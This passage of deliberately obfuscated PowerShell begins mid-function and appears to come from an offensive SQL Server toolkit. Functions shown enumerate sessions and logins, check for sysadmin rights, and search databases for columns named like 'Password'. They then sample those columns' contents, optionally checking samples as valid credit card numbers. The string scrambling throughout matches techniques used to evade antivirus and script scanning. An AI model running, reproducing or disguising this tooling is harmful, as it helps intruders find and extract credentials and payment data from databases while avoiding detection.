        ${n`UlL} = ${TBlSES`S`I`Ons}."cOl`Um`Ns".("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{3}{1}{4}" -f'Or','ncipal','iginalPr','i','Name'))
        ${N`ULl} = ${t`B`LSE`SSIoNS}."C`olumnS".("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{0}"-f'ionId','ess','S'))
        ${NU`lL} = ${TB`lseSs`I`ONs}."col`U`mnS".("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{1}{3}"-f't','artTi','SessionS','me'))
        ${nu`LL} = ${tB`lS`EsSiO`NS}."C`OLU`mnS".("{0}{1}"-f'Ad','d').Invoke(("{2}{0}{4}{3}{1}" -f 'i','me','SessionLog','Ti','n'))
        ${nu`lL} = ${t`Bls`ESs`ioNS}."C`ol`UMNs".("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{0}" -f'us','SessionSt','at'))
        if(${p`RIncIpaL`N`AMe}) {
            ${PRi`NcI`paLNaMEF`il`TeR} = (' '+'a'+'nd '+'lo'+'gin_nam'+'e'+' '+'lik'+'e '+"'$PrincipalName'")
        } else {
            ${PR`iNcIpaLNA`M`Ef`il`T`ER} = ''
        }
    } Process {
        ${coMput`eRN`AME} = &("{2}{3}{0}{6}{5}{7}{4}{1}"-f 'omp','ce','Get','-C','n','eFromIns','uterNam','ta') -Instance ${INST`AN`cE}
        if(-not ${in`S`TAn`Ce}) {
            ${iNSt`A`NcE} = ${eN`V:`Com`puTER`NamE}
        }
        ${te`stcon`NE`ct`ioN} = &("{4}{1}{6}{3}{5}{2}{0}"-f'est','et-SQ','nT','nnecti','G','o','LCo') -Instance ${INstA`NCe} -Username ${UserN`A`ME} -Password ${p`ASS`WoRd} | &('?') -FilterScript {
            ${_}."sT`At`US" -eq ("{0}{3}{2}{1}" -f 'Ac','le','sib','ces')
        }
        if(-not ${te`ST`CoNn`eCt`IoN}) {
            ("$Instance "+': '+'Connec'+'tion'+' '+'Fail'+'ed.')
            return
        }
        ${q`U`Ery} = (' '+' '+'US'+'E '+'mast'+'e'+'r;'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'ELECT '+' '+"'$ComputerName' "+'a'+'s '+'[Com'+'pute'+'rNam'+'e'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Ins'+'tance]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'secu'+'ri'+'t'+'y_id '+'as'+' '+'[Prin'+'ci'+'p'+'alS'+'i'+'d],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'log'+'in_n'+'ame '+'a'+'s '+'[Pr'+'i'+'ncipal'+'Name'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'ri'+'gi'+'nal_lo'+'gin_nam'+'e '+'as'+' '+'[Ori'+'ginalPrinc'+'ipalN'+'ame]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'es'+'sion_id '+'as'+' '+'[Sessi'+'onId]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'last_'+'re'+'q'+'u'+'est_st'+'art_time '+'as'+' '+'[S'+'es'+'s'+'ion'+'StartT'+'ime'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'log'+'in_ti'+'me '+'as'+' '+'[Sess'+'ionLoginT'+'ime],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'st'+'at'+'us '+'as'+' '+'['+'Se'+'ssionS'+'tatus]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FR'+'OM '+' '+' '+' '+'[s'+'ys'+'].'+'[dm_e'+'xe'+'c_se'+'ssi'+'ons]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ORDER'+' '+'B'+'Y '+'s'+'t'+'atus
 '+' '+' '+' '+' '+' '+' '+' '+"$PrincipalNameFilter")
        ${TBLR`Es`U`LTS} = &("{1}{2}{0}{3}" -f'e','Get-S','QLQu','ry') -Instance ${in`stA`NCe} -Query ${q`UeRY} -Username ${US`E`Rna`mE} -Password ${paS`swO`RD}
        ${T`BLreSUL`Ts} | &('%') -Process {
            if (${Ne`WSiD}) {
                ${nEW`sId} =  ${4`Fn}::("{1}{0}{2}" -f'oSt','T','ring').Invoke(${_}."PRInCip`A`LS`iD").("{0}{1}"-f'Re','place').Invoke('-','')
                if (${NEw`S`iD}."l`enGth" -le 10) {
    ${s`id} =   ( get-vAriabLe  ("2i"+"s0X") -VALuEoNL)::("{1}{2}{0}" -f't32','To','In').Invoke(${n`EwS`id},16)
                } else {
    ${s`ID} = ${n`EWsid}
                }
                ${nU`ll} = ${tbl`se`S`sIONS}."Ro`WS"."a`DD"(
                    [string]${_}."com`PuTe`RNA`Me",
                    [string]${_}."In`sT`AnCE",
                    ${S`iD},
                    [string]${_}."PR`iNCIpa`LN`AMe",
                    [string]${_}."ORI`g`in`AlP`Rin`CIPaLNa`me",
                    [string]${_}."SE`ssIonid",
                    [string]${_}."S`e`ss`iOnSTaRTtImE",
                    [string]${_}."SeS`s`IONlOG`in`TIMe",
                    [string]${_}."s`eSSI`OnstaTUs"
                )
            }
        }
    } End {
        ${t`B`lSeSSIONs}
    }
}
Function g`e`T-SqlsysA`D`mi`NcHeck {
    [CmdletBinding()]
    Param(
        [Parameter(MANdaTOry = ${F`A`lSe},
        hElPmEsSagE = {"{9}{3}{1}{5}{8}{4}{7}{6}{2}{0}" -f 'h.','cc','e wit','r or domain a',' ','o','icat','authent','unt to','SQL Serve'})]
        [string]${U`SERN`AMe},
        [Parameter(mANdATORy = ${Fa`L`Se},
        heLpmesSaGE = {"{2}{15}{11}{7}{0}{4}{10}{13}{8}{14}{9}{1}{16}{3}{5}{12}{6}"-f' a','to','SQL ','ti','cco','ca','h.','main','t p','ssword ','u','o','te wit','n','a','Server or d',' authen'})]
        [string]${p`AS`SWorD},
        [Parameter(mAndaTOrY = ${FA`L`se},
        heLpMeSsagE = {"{3}{8}{9}{4}{5}{6}{10}{2}{7}{1}{0}"-f'to.','tion ','nn','S','ver in','stance t','o c','ec','QL ','Ser','o'})]
        [string]${INs`T`AncE}
    )
    Begin {
        ${t`BL`s`y`SadmiNstaTuS} = &("{2}{0}{1}{3}" -f'bje','c','New-O','t') -TypeName ("{0}{3}{1}{2}{5}{6}{4}" -f 'System','Dat','a.D','.','ble','at','aTa')
        if(${cREDe`N`TIa`Ln`AMe}) {
            ${c`REDENTiaLnAm`EF`i`l`T`Er} = (' '+'WH'+'ERE '+'n'+'ame '+'l'+'ike '+"'$CredentialName'")
        } else {
            ${CR`E`DEntiA`lnaM`Ef`ILtEr} = ''
        }
    } Process {
        ${C`o`m`pUteRna`me} = &("{3}{5}{0}{2}{1}{4}" -f 'ComputerNam','omInst','eFr','Get','ance','-') -Instance ${in`sTaN`ce}
        if(-not ${I`NsTaN`ce}) {
            ${INsTA`N`Ce} = ${EN`V`:CoMp`UTernamE}
        }
        ${t`eS`TCONnecTI`ON} = &("{1}{2}{4}{0}{3}" -f 'onne','Ge','t-SQL','ctionTest','C') -Instance ${I`N`sTanCe} -Username ${u`S`erNAME} -Password ${p`AS`sWord} | 
        &('?') -FilterScript { ${_}."ST`ATUS" -eq ("{1}{2}{0}" -f 'ble','Access','i') }
        if(-not ${te`S`TconN`ecTiOn}) {
            ("$Instance "+': '+'Conn'+'e'+'ction'+' '+'Fai'+'led.')
            return
        }
        ${QUE`RY} = ('S'+'EL'+'ECT '+"'$ComputerName' "+'as'+' '+'['+'Comput'+'erName'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Insta'+'n'+'ce'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'C'+'ASE
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HEN '+('IS_S'+'R'+'VR'+'O'+'LEM'+'E'+'MBER({'+'0}'+'sysadmin{'+'0}) ') -F  [chAr]39+'= '+' '+'0 '+'TH'+'EN '+(('EWBNoEWB
 ')  -replAcE'EWB',[char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELS'+'E '+(('y'+'cbYesy'+'cb
 ') -crEpLACE([chAR]121+[chAR]99+[chAR]98),[chAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END'+' '+'a'+'s '+'IsSys'+'adm'+'in')
        ${tBLS`ySAD`M`INS`TA`T`USTEMP} = &("{1}{2}{0}{3}" -f 'Qu','Get-SQ','L','ery') -Instance ${i`NS`Ta`NCe} -Query ${QU`ERy} -Username ${User`Na`me} -Password ${pa`s`SwOrd}
        ${t`BLsyS`ADMINsTAt`US} = ${tBlSySa`D`MI`NS`TatuS} + ${tBLS`ySad`MINSTatuSt`e`mp}
    } End {
        ${tbLSYsADmi`Ns`T`ATuS}
    }
}
Function get-`Sql`c`OlUm`NSamP`LEdATa {
    [CmdletBinding()]
    Param(
        [Parameter(MandATorY = ${Fal`se},
        HelPmESsAGe = {"{9}{7}{1}{10}{11}{0}{3}{4}{6}{8}{13}{5}{12}{2}{14}" -f'c','erve','th','oun','t t','ticate','o ','L S','authe','SQ','r or d','omain ac',' wi','n','.'})]
        [string]${US`er`NAmE},
        [Parameter(MAnDatoRY = ${F`Al`sE},
        helpMESsaGe = {"{5}{0}{9}{6}{1}{11}{2}{3}{7}{4}{10}{8}{12}" -f ' or doma',' a','ssw','or','o authe','SQL Server','n','d t','ti','i','n','ccount pa','cate with.'})]
        [string]${pas`Sw`Ord},
        [Parameter(MandatOry = ${F`AlsE},
        helpmeSSAgE = {"{4}{3}{0}{2}{6}{8}{5}{1}{7}" -f 'e','to c','rver ','L S','SQ','nce ','in','onnection to.','sta'})]
        [string]${iNS`TAn`Ce},
        [Parameter(MaNdaTorY = ${f`AL`se},
        helPMEsSage = {(("{4}{2}{3}{1}{0}"-f 'ut anything.','utp','nWsGt ','o','Do'))."R`EpLacE"('WsG',[sTRing][chAR]39)})]
        [switch]${NOoU`T`pUt},
        [Parameter(MANdatory = ${fa`L`SE},
        hElPmESsAgE = {"{4}{3}{5}{0}{1}{2}"-f 'ds to',' sam','ple.','er of ','Numb','recor'})]
        [int]${SA`Mplesi`ze} = 1,
        [Parameter(MANDATorY = ${F`AlsE},
        helPmEssAgE = {"{4}{6}{8}{0}{12}{5}{9}{13}{2}{7}{14}{11}{3}{10}{1}" -f'ma se','.','f keywords ','arch f','C','erat','o','to','m','ed ','or','se','p','list o',' '})]
        [string]${kEyW`oRDs} = ("{1}{0}" -f'word','Pass'),
        [Parameter(MaNDaTorY = ${f`A`Lse},
        HelPmesSaGE = {"{1}{3}{2}{6}{4}{0}{5}"-f't','Data','am','base n','to fil','er on.','e '})]
        [string]${DA`T`A`BasEn`Ame},
        [Parameter(MaNdaTOrY = ${f`Alse},
        HELpmeSsaGE = {"{12}{10}{6}{8}{7}{0}{11}{4}{3}{2}{1}{9}{5}"-f 'he',' ','le','f samp','k i','dit card.','m','c','ula to ','is a valid cre','se Luhn for','c','U'})]
        [switch]${VAlIda`T`EcC},
        [Parameter(mAndATOry = ${FA`L`sE},
        HElPmeSsaGe = {(("{9}{1}{0}{7}{6}{12}{4}{11}{8}{2}{5}{10}{3}"-f'Mt','nAi','d','s.','tables fr','atab','se',' ','m default ','Do','ase','o','lect '))."Rep`LACe"('AiM',[STRING][chaR]39)})]
        [switch]${N`oDe`F`AuLTS}
    )
    Begin {
        ${t`BLD`Ata} = &("{0}{1}{2}{3}" -f 'Ne','w-O','b','ject') -TypeName ("{4}{5}{0}{1}{3}{2}"-f'tem.Data.Da','ta','ble','Ta','Sy','s')
        ${N`ULl} = ${tB`Ld`AtA}."Co`LumNS".("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{0}"-f 'me','uterNa','Comp'))
        ${NU`lL} = ${t`BLDaTA}."C`OlumNs".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}"-f 'Instan','ce'))
        ${N`UlL} = ${tb`ldaTa}."Co`lu`mNs".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{2}"-f'Da','tab','ase'))
        ${nU`LL} = ${tBl`data}."col`UmNS".("{1}{0}"-f 'dd','A').Invoke(("{0}{1}" -f'Sc','hema'))
        ${nU`ll} = ${TB`l`DAtA}."co`L`UmnS".("{1}{0}" -f 'dd','A').Invoke(("{0}{1}"-f 'T','able'))
        ${nU`lL} = ${t`B`ldATa}."COl`UMNS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}" -f 'Co','lumn'))
        ${nu`LL} = ${T`Bld`AtA}."CO`L`UMns".("{1}{0}" -f'dd','A').Invoke(("{1}{0}" -f 'e','Sampl'))
        ${Nu`Ll} = ${T`Bld`Ata}."c`ol`UmNs".("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{1}"-f 'owCou','nt','R'))
        if(${va`L`IdatECc}) { ${nU`ll} = ${Tb`lD`Ata}."c`OLU`MnS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}"-f'I','sCC')) }
    } Process {
        ${CoMPut`E`R`NAme} = &("{4}{1}{0}{2}{3}{5}" -f 'puter','et-Com','NameFromI','nst','G','ance') -Instance ${I`N`STaNCE}
        if(-not ${IN`S`T`ANCe}) { ${Ins`T`AncE} = ${eNV`:co`MPUTeRN`AME} }
        ${t`EstC`OnNECt`ION} = &("{2}{0}{3}{1}" -f'QLCo','ctionTest','Get-S','nne') -Instance ${Inst`A`Nce} -Username ${useR`N`AME} -Password ${paS`S`w`orD} | &('?') -FilterScript { ${_}."s`T`ATuS" -eq ("{0}{1}{2}" -f 'Accessib','l','e') }
        if(-not ${teS`Tc`on`NectI`on}) {
            ("$Instance "+': '+'CO'+'NNEC'+'TIO'+'N '+'FAI'+'LED')
            Return
        } else {
            ("$Instance "+': '+'START'+' '+'SEAR'+'CH '+'DAT'+'A '+'BY'+' '+'COLUM'+'N '+'')
            ("$Instance "+': '+'- '+'Conn'+'ec'+'tion '+'S'+'uc'+'cess. '+'')
            ("$Instance "+': '+'- '+'Sea'+'r'+'chi'+'ng '+'fo'+'r '+'c'+'olumn '+'na'+'mes '+'tha'+'t '+'matc'+'h '+'criteri'+'a...'+' '+'')
            if(${no`dEFaU`L`TS}) {
                ${CO`L`UmNS} = &("{1}{2}{0}" -f 'Column','Ge','t-SQL') -Instance ${i`NsTan`CE} -Username ${US`ErnaME} -Password ${pasS`w`orD} -DatabaseName ${DAta`BAseNa`Me} -ColumnNameSearch ${kEY`wOR`dS} -NoDefaults
            } else {
                ${COl`UmNS} = &("{1}{0}{2}"-f'et-SQLC','G','olumn') -Instance ${iNST`ANCE} -Username ${U`se`RnaMe} -Password ${pASS`WORd} -DatabaseName ${d`ATAb`AS`eNamE} -ColumnNameSearch ${kEYW`oRdS} 
            }
        }
        if(${Co`lUM`Ns}) {
            ${co`l`UMNs} | &('%') -Process {
                &("{1}{0}{2}" -f'te','Wri','-Verbose') ${_}."DATA`Ba`SEna`ME"
                ${SDataBA`Sen`AmE} = ${_}."DAtAba`S`enAME"
                ${SS`CHE`MANAmE} = ${_}."sCh`emaNa`me"
                ${ST`Abl`ENA`mE} = ${_}."Table`N`AMe"
                ${s`cOLum`N`NamE} = ${_}."CoL`Um`NNaMe"
                ${AFF`eCt`eD`CoLumn} = "[$sDatabaseName].[$sSchemaName].[$sTableName].[$sColumnName]"
                ${a`F`F`ectEd`TaBle} = "[$sDatabaseName].[$sSchemaName].[$sTableName]"
                ${QU`e`Ry} = ('U'+'SE '+"$sDatabaseName; "+'SELE'+'CT'+' '+'T'+'OP '+"$SampleSize "+"[$sColumnName] "+'FROM'+' '+"$AffectedTable "+'WHE'+'RE '+"[$sColumnName] "+'i'+'s '+'n'+'ot '+'nul'+'l')
                ${q`Ue`RyrOw`Cou`Nt} = ('U'+'SE '+"$sDatabaseName; "+'S'+'ELE'+'CT '+"count(CAST([$sColumnName] "+'a'+'s '+'VARCHAR(2'+'00'+')'+'))'+' '+'a'+'s '+'Nu'+'mRo'+'ws '+'FR'+'OM '+"$AffectedTable "+'W'+'HER'+'E '+"[$sColumnName] "+'is'+' '+'no'+'t '+'n'+'ull')
                
                ("$Instance "+': '+'- '+'Table'+' '+'m'+'atch'+': '+"$AffectedTable "+'')
                ("$Instance "+': '+'- '+'Co'+'lumn '+'mat'+'ch: '+"$AffectedColumn "+'')
                ("$Instance "+': '+'- '+'Sel'+'ecti'+'ng '+"$SampleSize "+'ro'+'ws '+'o'+'f '+'data'+' '+'sampl'+'e '+'fro'+'m '+'c'+'olumn '+"$AffectedColumn. "+'')

                ${ROw`co`UNtO`UT} = &("{2}{1}{0}"-f 'QLQuery','t-S','Ge') -Instance ${I`N`sTANcE} -Username ${User`N`AME} -Password ${pASs`wOrd} -Query ${Q`UerY`RO`wcOU`Nt} 
                ${rO`wcO`Unt} = ${RO`w`cO`UntouT}."Nu`MRoWS"
                ${sqlq`Ue`Ry} = &("{1}{3}{2}{0}"-f'y','Ge','Quer','t-SQL') -Instance ${inst`AN`Ce} -Username ${u`sERNA`mE} -Password ${P`ASS`W`OrD} -Query ${quE`RY}
                ${sql`quE`RY}.${SCO`LuM`N`NamE} | &('%') -Process {
                        ${N`UlL} = ${t`Bld`Ata}."rO`ws".("{1}{0}"-f 'd','Ad').Invoke(${cOm`pUte`R`NaME}, ${i`Nst`Ance}, ${sd`AT`ABa`SEna`me}, ${S`s`chEMAnaMe}, ${StABL`EN`AME}, ${sc`oLUmn`NAme}, ${_}, ${R`OwCo`UNT})
                }
            }
        } else {
                ("$Instance "+': '+'- '+'N'+'o '+'c'+'olumn'+'s '+'we'+'re '+'fo'+'und '+'tha'+'t '+'ma'+'tche'+'d '+'the'+' '+'s'+'ea'+'rch. '+'')
        }
        ("$Instance "+': '+'E'+'ND '+'SE'+'ARCH '+'DAT'+'A '+'B'+'Y '+'CO'+'LUMN'+' '+'')
    } End {
        ForEach (${R`Ow} in ${TB`lDaTa}) {
            ("{3}{1}{4}{0}{2}" -f 'm','N','e : ','Computer','a') + ${r`Ow}."C`omp`UTEr`NamE" 
            ("{3}{1}{2}{0}"-f' ','ta','nce     :','Ins') + ${R`ow}."InstA`NcE" 
            ("{0}{2}{3}{1}" -f'Dat','se     : ','ab','a') + ${r`OW}."D`ATaBA`se" 
            ("{4}{0}{1}{3}{2}"-f'chema','  ','   : ','  ','S') + ${R`OW}."s`CHema" 
            ("{1}{2}{3}{0}{4}" -f' :','Tab','le     ','  ',' ') + ${r`oW}."TA`BLe" 
            ("{4}{0}{3}{2}{1}" -f 'lu',' : ','     ','mn ','Co') + ${R`OW}."col`U`Mn" 
            ("{3}{0}{2}{1}" -f'    ','  : ',' ','Sample') + ${r`ow}."S`AmpLE" 
            ("{3}{1}{0}{2}{4}" -f 'wCount ','o','    :','R',' ') + ${R`ow}."R`OW`COunT" 
            ""
        }
    }
}